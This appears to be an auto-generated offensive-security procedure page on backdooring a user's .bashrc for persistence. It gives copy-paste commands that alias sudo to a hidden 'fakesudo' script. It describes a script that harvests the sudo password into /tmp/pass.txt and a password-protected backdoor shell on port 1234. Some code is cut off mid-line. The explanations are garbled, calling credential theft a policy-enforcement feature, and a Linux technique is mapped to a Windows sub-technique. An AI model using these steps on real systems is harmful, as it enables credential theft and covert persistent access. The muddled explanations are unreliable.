---
id: 6ac2ef14-d267-4339-8f40-bb93c97c940d
name: Bashrc Backdoor Persistence
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:17.980645+00:00'
updated_at: '2023-04-10T20:34:16.884534+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Create or Modify System Process|T1543 - Create or Modify System Process]]'
- '[[Masquerading|T1036 - Masquerading]]'
sub_techniques:
- '[[Windows Service|T1543.003 - Windows Service]]'
tags:
- '[[Backdooring a user''s bash_rc]]'
- '[[Linux - Persistence]]'
commands:
- '[[Create sudo alias]]'
- '[[Make fakesudo executable]]'
- '[[Print message]]'
---

# Bashrc Backdoor Persistence

## Summary

Bashrc Backdoor Persistence is a technique used to maintain access to a target system by modifying the bashrc file of a user. This technique involves adding malicious code to the bashrc file, which will execute every time the user logs in. The malicious code can be used to create a backdoor, steal 

## Description

# Description

Bashrc Backdoor Persistence is a technique used to maintain access to a target system by modifying the bashrc file of a user. This technique involves adding malicious code to the bashrc file, which will execute every time the user logs in. The malicious code can be used to create a backdoor, steal credentials, or perform other malicious activities. This technique is commonly used by attackers to maintain persistence on a compromised system.

From a technical perspective, the attacker modifies the bashrc file of a user to add a command that will execute the malicious code. This can be accomplished by adding an alias or modifying the existing sudo command to execute the malicious code. Once the user logs in, the malicious code is executed, and the attacker gains access to the system.

From a business perspective, this technique can be used to maintain access to a compromised system, steal sensitive data, or perform other malicious activities. It is important to secure systems against this type of attack to prevent data breaches and other security incidents.

## Requirements

1. Access to the target system

1. Ability to modify the bashrc file of a user

## Defense

1. Regularly monitor the bashrc file for any unauthorized changes

1. Implement strict access controls to prevent unauthorized modification of the bashrc file

1. Use endpoint protection software to detect and prevent this type of attack

## Objectives

1. Maintain access to a compromised system

1. Steal sensitive data

1. Perform other malicious activities

# Instructions

1. To use this command, copy and paste it into the terminal and run it. Once executed, you can use the sudo command to open a backdoor shell by entering the password specified during the execution of this command.

**Code**: [[TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-]]

> This command creates a backdoor shell by setting an alias for sudo command to listen on port 1234 and execute /bin/bash. The shell is password protected, and the password is entered by the user when the sudo command is used. This can be used to gain root access to the system.

2. To create an alias for fakesudo in bash, run the following commands:

**Code**: [[$ chmod u+x ~/.hidden/fakesudo
$ echo "alias sudo=]]

> The first command sets the execute permission for the fakesudo script located in the .hidden directory. The second command adds an alias for sudo to the .bashrc file which points to the fakesudo script. This allows the user to run sudo commands through the fakesudo script, which can be used to log sudo usage and enforce sudo password policies.

**Command** ([[Make fakesudo executable]]):

```bash
$ chmod u+x ~/.hidden/fakesudo
```

**Command** ([[Create sudo alias]]):

```bash
$ echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc
```

3. The 'fakesudo' command is a fake version of the 'sudo' command in Linux. It allows a user to execute commands with superuser privileges without entering a password. This command is not recommended for use in production environments.

**Code**: [[fakesudo]]

> The 'fakesudo' command takes in the same arguments as the 'sudo' command. It allows the user to execute a command with elevated privileges, as if they were the root user. This can be useful for performing administrative tasks or running commands that require elevated permissions. However, it is important to use this command with caution, as it can potentially cause damage to the system if used improperly.

**Command** ([[Print message]]):

```bash
fakesudo echo 'You do not have the necessary permissions to run this command'
```

4. This command prompts the user for their sudo password and logs the password to a file. It then executes the command with sudo privileges. The command can take any arguments that would normally be passed to sudo.

**Code**: [[read -sp "[sudo] password for $USER: " sudopass
ec]]

> The `read` command prompts the user for their sudo password and stores it in the variable `sudopass`. The `-s` option ensures that the password is not displayed as the user types it. The `-p` option displays the prompt `[sudo] password for $USER:`.

The first `echo` command is used to add a newline character after the user enters their password. The `sleep` command pauses for 2 seconds before displaying the message `Sorry, try again.` This is done to make it more difficult for an attacker to determine whether the password was correct or not.

The second `echo` command appends the password to the file `/tmp/pass.txt`. This file should be protected with appropriate permissions to prevent unauthorized access.

The final command `/usr/bin/sudo $@` executes the command with sudo privileges. The `$@` syntax passes any arguments that were passed to the script onto the sudo command.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Create or Modify System Process|T1543 - Create or Modify System Process]]
- [[Masquerading|T1036 - Masquerading]]

### Sub-Techniques

- [[Windows Service|T1543.003 - Windows Service]]

## Commands Used

- [[Create sudo alias]]
- [[Make fakesudo executable]]
- [[Print message]]

## Tags

- [[Backdooring a user's bash_rc]]
- [[Linux - Persistence]]
